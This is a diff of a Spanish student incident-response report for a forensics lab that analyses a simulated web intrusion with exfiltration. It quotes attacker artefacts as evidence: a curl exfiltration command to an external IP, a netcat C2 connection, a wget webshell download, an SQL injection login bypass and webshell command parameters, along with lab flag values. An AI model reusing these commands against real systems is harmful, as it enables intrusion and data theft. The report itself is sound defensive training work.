@@ -2,12 +2,12 @@
 
 **Grupo:** 10  
 **Investigadora:** Carolina Paula Corazza — @carocor1  
-**Fecha:** Pendiente de entrega.  
+**Fecha:** 06/11/2026.
 **Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración
 
 ## 0. Declaración de uso de IA
 
-Se utilizó OpenCode como apoyo para explicar la verificación de hashes y preparar el script reproducible de cadena de custodia. La investigadora verificó los hashes contra `labs/lab11-forensia/caso/evidencia.sha256`, contrastó las referencias con los artefactos originales y revisó que el script normalice CRLF a LF solo en memoria, sin modificar la evidencia.
+Se utilizó OpenCode como apoyo para explicar la verificación de hashes y preparar el script reproducible de cadena de custodia. La investigadora verificó los hashes contra `labs/lab11-forensia/caso/evidencia.sha256`, contrastó las referencias con los artefactos originales y revisó que el script normalice CRLF a LF solo en memoria, sin modificar la evidencia. Para la revisión final de cumplimiento se volvió a contrastar el informe con el enunciado, la rúbrica y los artefactos del caso, sin alterar esta declaración.
 
 ## 1. Resumen del incidente
 
@@ -15,13 +15,13 @@ Los registros muestran que una IP externa enumeró el sitio y luego obtuvo respu
 
 ## 2. Cadena de custodia
 
-Se comparó el SHA-256 de cada archivo listado en `evidencia.sha256` con el hash registrado al preservar la evidencia. Como el entorno Windows presenta finales de línea CRLF mientras que el repositorio conserva LF, el verificador convierte CRLF a LF solo en memoria antes de calcular el hash. No se escribieron cambios en los archivos originales del caso.
+Se comparó el SHA-256 de cada archivo listado en `evidencia.sha256` con el hash registrado al preservar la evidencia. El verificador convierte CRLF a LF solo en memoria cuando detecta esos finales de línea; no escribe cambios en los archivos originales del caso.
 
 El resultado fue **8 archivos coincidentes, 1 discrepancia y 0 archivos faltantes**. `logs/auth.log` no coincide: el manifiesto registra `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`, mientras que el hash calculado tras normalizar finales de línea es `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`. Los otros ocho archivos listados coinciden con sus hashes esperados.
 
 La discrepancia de `auth.log` es consistente con las advertencias incluidas en el propio archivo (líneas 1 y 5–7), pero el hash por sí solo no establece quién lo modificó ni cuándo. Por cadena de custodia, se conserva el archivo tal como fue recibido, se documenta la discrepancia y se trata su contenido con cautela; no se intenta repararlo ni reemplazarlo.
 
-La ejecución reproducible está en `verificar_custodia.py` y su salida completa en `verificacion-custodia.txt`. El reporte registra hashes esperados y calculados para cada archivo. El verificador termina con código 1 cuando encuentra una discrepancia o un archivo faltante; para esta ejecución eso señala el `MISMATCH` esperado de `logs/auth.log`, no una falla al calcular los hashes.
+La ejecución reproducible está en `verificar_custodia.py` y su salida completa en `verificacion-custodia.txt`. El reporte registra hashes esperados y calculados para cada archivo. El verificador termina con código 1 cuando encuentra una discrepancia o un archivo faltante; para esta ejecución eso señala el `MISMATCH` de `logs/auth.log`, no una falla al calcular los hashes.
 
 ## 3. Línea de tiempo del ataque
 
@@ -70,6 +70,8 @@ Los hechos más sólidos son los que aparecen en dos o más fuentes: la descarga
 
 ## 4. Indicadores de compromiso (IOCs)
 
+El SHA-256 de `shell.php.evidencia.txt` corresponde al archivo de evidencia neutralizado, no al binario PHP original; no se atribuye ese hash al webshell desplegado.
+
 | Tipo | Valor | Evidencia y límite |
 |---|---|---|
 | IP atacante | `185.220.101.42` | Aparece en el sondeo, enumeración y solicitudes del incidente (`labs/lab11-forensia/caso/logs/access.log:6-22`). Es el origen observado en esos registros; no atribuye identidad o actor. |
@@ -87,13 +89,13 @@ A partir de los artefactos del caso, delimitamos el impacto del ataque diferenci
 1. **Consulta al archivo de clientes por canal web:**
    - En `labs/lab11-forensia/caso/logs/access.log:22` figura la petición `GET /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt HTTP/1.1` desde `185.220.101.42` a las 02:23:15 UTC. El servidor web registró una respuesta con código 200 y 48.210 bytes.
    - **Límite de la evidencia:** El registro documenta una solicitud y una respuesta HTTP 200 de 48.210 bytes hacia la IP del atacante, lo cual es compatible con una posible exposición de información. Sin embargo, este registro por sí solo no demuestra que el comando se haya ejecutado correctamente, no permite confirmar que el contenido entregado en esos bytes corresponda efectivamente al archivo solicitado, ni garantiza que el atacante los haya recibido o conservado.
-2. **Exposición de variables de entorno y archivos de configuración:**
-   - En `labs/lab11-forensia/caso/memoria/bash_history.txt:3` se observa el comando `cat /var/www/.env`, lo que expuso los secretos y configuraciones de la aplicación en la sesión del atacante.
-   - En `labs/lab11-forensia/caso/logs/access.log:17` (02:17:41 UTC) hay una petición a `/backup/rrhh.conf` con respuesta 200 (210 bytes). Aunque un código 200 no demuestra por sí solo que el archivo se haya leído correctamente, existe la hipótesis fundada de que expuso el token `phantom-api-7c1e`, ya que inmediatamente después (`access.log:18`, 02:18:10 UTC) el atacante usó ese mismo token para consultar `/api/reporte`.
+2. **Acceso a variables de entorno y archivos de configuración:**
+   - En `labs/lab11-forensia/caso/memoria/bash_history.txt:3` se observa el comando `cat /var/www/.env`, compatible con la lectura de secretos/configuración desde la shell; el contenido leído no está incluido en el paquete, por lo que no se puede determinar qué valores concretos quedaron expuestos.
+   - En `labs/lab11-forensia/caso/logs/access.log:17` (02:17:41 UTC) hay una petición a `/backup/rrhh.conf` con respuesta 200 (210 bytes). El código 200 acredita una respuesta HTTP, pero no conocemos su contenido; como luego se usa `phantom-api-7c1e` en `access.log:18`, el archivo pudo ser una vía de obtención del token, aunque el paquete no demuestra que ese valor estuviera dentro del archivo.
 3. **Preparación e intento de envío del archivo de clientes:**
    - En `labs/lab11-forensia/caso/memoria/bash_history.txt:8` el atacante ejecutó `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`. La creación de este archivo comprimido se confirma en el disco (`labs/lab11-forensia/caso/disco/listado.txt:7`, con 48.210 bytes a las 02:23) y en memoria (`labs/lab11-forensia/caso/memoria/lsof.txt:5`, con el descriptor abierto por el proceso `bash` PID 1240).
    - En `labs/lab11-forensia/caso/memoria/bash_history.txt:9` figura el intento de envío mediante `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`.
-   - **Lo que no está demostrado:** No hay evidencia de que el servidor externo `45.13.37.7` haya recibido el archivo. El comando `curl` se ejecutó con `-s` (silencioso), no disponemos de captura de paquetes (PCAP) ni de logs del receptor, y en `labs/lab11-forensia/caso/memoria/netstat.txt` no figura ninguna conexión asociada a `curl`.
+   - **Lo que no está demostrado:** El historial documenta el comando de envío, pero no prueba que `curl` terminara con éxito ni que el servidor externo `45.13.37.7` recibiera el archivo. No disponemos de captura de paquetes (PCAP), logs del receptor ni una conexión asociada a `curl` en `labs/lab11-forensia/caso/memoria/netstat.txt`.
 
 ### 5.2 Nivel de acceso y privilegios
 
@@ -118,10 +120,10 @@ Estas recomendaciones técnicas se desprenden de los artefactos analizados y no 
 
 ### 6.1 Contención
 
-1. **Aislar el servidor:** Desconectar de la red el equipo `phantomcorp-web` (10.0.0.5) para cortar la comunicación activa del C2 (`45.13.37.7:4444`) e impedir nuevos accesos o movimientos laterales.
+1. **Aislar el servidor:** Aislar de la red el equipo `phantomcorp-web` (10.0.0.5), coordinando el corte con la adquisición de evidencia volátil; la captura disponible muestra un canal C2 activo (`45.13.37.7:4444`) a las 02:30 UTC.
 2. **Bloquear conexiones externas:** Aplicar reglas en el firewall de borde para bloquear todo tráfico hacia y desde las IPs `185.220.101.42` y `45.13.37.7` (en particular los puertos 80 y 4444).
 3. **Preservar la evidencia antes de actuar:** Tomar una imagen forense completa de disco y verificar la captura de memoria antes de reiniciar el equipo o detener procesos.
-4. **Detener procesos maliciosos:** Una vez asegurada la memoria, finalizar los procesos vinculados al ataque observados en la captura: PID 1490 (`nc`), PID 1477 (`system-check`), PID 1240 (`bash`) y PID 1201 (`sh`).
+4. **Detener procesos maliciosos:** Una vez preservada la memoria y documentado el impacto del aislamiento, contener los procesos vinculados observados en la captura: PID 1490 (`nc`), PID 1477 (`system-check`), PID 1240 (`bash`) y PID 1201 (`sh`). Los PID son los de la fotografía histórica y se deben volver a identificar en el sistema antes de actuar; no asumir que siguen siendo los mismos.
 
 ### 6.2 Erradicación
 
@@ -146,13 +148,15 @@ Estas recomendaciones técnicas se desprenden de los artefactos analizados y no 
 
 ## 7. Preguntas de análisis
 
+> Nota: algunos artefactos incluyen marcadores `FLAG{...}` que son flags de los retos y se citan como evidencia forense. El estado general de los retos se documenta en `ctf-status-11.txt`.
+
 ### P1 — Orden de volatilidad
 
 La memoria se captura antes que el disco por el orden de volatilidad: lo que se pierde primero se preserva primero, según el enunciado del laboratorio. La RAM no sobrevive a un apagado o reinicio, mientras que el disco persiste, de modo que cualquier acción previa a la captura, incluso apagar el equipo, puede destruir información que nunca estuvo en el disco.
 
 En este caso, la memoria conserva al menos tres elementos que el disco ya no tiene o nunca tuvo:
 
-1. **El historial de comandos.** El encabezado de `memoria/bash_history.txt:1` indica que fue recuperado de memoria y que «el del disco fue borrado por el atacante»; además, el último comando registrado es `history -c` (línea 10). Gracias a la copia en RAM se pueden leer la descarga de la webshell, la búsqueda de binarios SUID, la creación del tar y el `curl` de subida (líneas 4 y 5-9).
+1. **El historial de comandos.** El encabezado de `memoria/bash_history.txt:1` indica que fue recuperado de memoria y que «el del disco fue borrado por el atacante»; además, el último comando registrado es `history -c` (línea 10). Gracias a la copia en RAM se pueden leer la descarga de la webshell, la búsqueda de binarios SUID, la creación del tar y el comando `curl` de intento de envío (líneas 4 y 5-9).
 2. **Los procesos en ejecución.** `memoria/pslist.txt:7-9` muestra la shell del atacante, `system-check` con `euid=0` y `nc 45.13.37.7 4444`. El disco solo muestra el binario `system-check` en `listado.txt:5`; no muestra que estuviera ejecutándose ni quién lo hacía.
 3. **La conexión de red.** `memoria/netstat.txt:4` registra el socket `ESTABLISHED` desde `10.0.0.5:41022` hacia `45.13.37.7:4444`, asociado al PID 1490 (`nc`). Una conexión activa desaparece al reiniciar, y ninguno de los artefactos de disco del caso la describe.
 
@@ -164,7 +168,7 @@ Comparé el SHA-256 de `logs/auth.log` con el valor registrado para ese archivo 
 
 ### P3 — Correlación de artefactos
 
-La descarga de la webshell puede correlacionarse en tres artefactos dentro de una ventana cercana a las 02:19 del 05/09/2026. `labs/lab11-forensia/caso/logs/access.log:20` registra a las 02:19:02 UTC una solicitud que ejecuta `wget` desde `45.13.37.7` para guardar `s.php` como `/var/www/uploads/shell.php`. `labs/lab11-forensia/caso/disco/listado.txt:4` ubica ese archivo con hora 02:19, con precisión de minuto y sin zona horaria indicada. `labs/lab11-forensia/caso/memoria/bash_history.txt:4` conserva el mismo comando y destino, pero no asigna hora individual a los comandos. En conjunto respaldan el despliegue de la webshell alrededor de ese momento; las marcas no son idénticas y no permiten fijar un segundo exacto para la creación del archivo o la ejecución del comando.
+El evento es la descarga y despliegue de la webshell. El `access.log` registra la solicitud a las **02:19:02 UTC** (`labs/lab11-forensia/caso/logs/access.log:20`); el `listado.txt` ubica el archivo `/var/www/uploads/shell.php` a las **02:19**, con precisión de minuto y sin zona horaria indicada (`labs/lab11-forensia/caso/disco/listado.txt:4`); y `bash_history.txt:4` conserva el comando `wget` correspondiente, aunque sin hora individual. Las tres fuentes convergen en el mismo evento alrededor de las 02:19, pero no tienen timestamps idénticos: no es posible atribuir al comando de historial una hora exacta ni elevar la marca de minuto del disco a precisión de segundos.
 
 ### P4 — Recuperación del historial
 
@@ -181,7 +185,7 @@ Un investigador forense necesita entender cómo opera un atacante para saber qu�
    - *Técnica:* Inyección de sentencias SQL para alterar la autenticación y ejecución de comandos a través de parámetros no sanitizados.
    - *Evidencias:*
      - **SQL Injection:** En `labs/lab11-forensia/caso/logs/access.log:14-16`, tras dos intentos fallidos con código 401, el atacante envió una petición con `user=admin'--` a `/portal-rrhh/login` recibiendo código HTTP 200 (180 bytes). Un código 200 por sí solo no garantiza que la autenticación haya sido superada, pero la secuencia temporal y el uso del payload de SQLi sostienen la hipótesis de un bypass de login en ese portal.
-     - **RCE:** En `labs/lab11-forensia/caso/logs/access.log:18-20` se registraron consultas a `/api/reporte?token=phantom-api-7c1e&cmd=...` ejecutando comandos como `id`, `echo` y `wget`. El rastro en disco quedó en `labs/lab11-forensia/caso/disco/listado.txt:3` (`/tmp/.p`, creado a las 02:18 con 12 bytes), y en memoria en `labs/lab11-forensia/caso/memoria/pslist.txt:6` con el proceso `sh -c wget ...` (PID 1201) generado por `nginx`.
+     - **RCE:** En `labs/lab11-forensia/caso/logs/access.log:18-20` se registraron consultas a `/api/reporte?token=phantom-api-7c1e&cmd=...` con comandos como `id`, `echo` y `wget`. La petición `echo` deja el marcador del reto en `logs/access.log:19` y un archivo de 12 bytes en `/tmp/.p` (`disco/listado.txt:3`); la petición `wget` también aparece como proceso `sh -c wget ...` (PID 1201) en memoria (`memoria/pslist.txt:6`).
 3. **Uso de webshell:**
    - *Técnica:* Subida de un script para mantener ejecución remota de comandos por HTTP.
    - *Evidencia:* La descarga se solicitó vía RCE (`access.log:20`) y el archivo se confirmó en `labs/lab11-forensia/caso/disco/listado.txt:4` (`/var/www/uploads/shell.php`, creado a las 02:19). Su contenido neutralizado en `labs/lab11-forensia/caso/disco/var/www/uploads/shell.php.evidencia.txt:8` muestra la ejecución mediante `sys'tem($_GET['c'])`, y en `labs/lab11-forensia/caso/logs/access.log:21-22` figuran las peticiones invocando comandos con el parámetro `?c=`.
